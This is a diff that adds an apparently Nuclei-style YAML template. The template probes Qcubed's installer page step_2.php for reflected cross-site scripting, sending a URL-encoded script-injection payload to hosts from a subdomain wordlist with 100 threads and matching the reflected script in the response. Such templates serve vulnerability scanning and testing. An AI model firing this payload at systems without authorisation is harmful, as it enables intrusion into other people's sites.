@@ -1,0 +1,32 @@
+id: qcubed-xss 2
+info:
+  name: Qcubed Reflected XSS
+  author: pikpikcu
+  severity: medium
+  reference: https://github.com/qcubed/qcubed/issues/1230
+  tags: xss,qcubed
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+    raw:
+      - |
+        GET /qcubed/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
+        Host: {{Subdomains}}
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '</script><script>alert(document.domain)</script>'
+        part: body
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - text/html
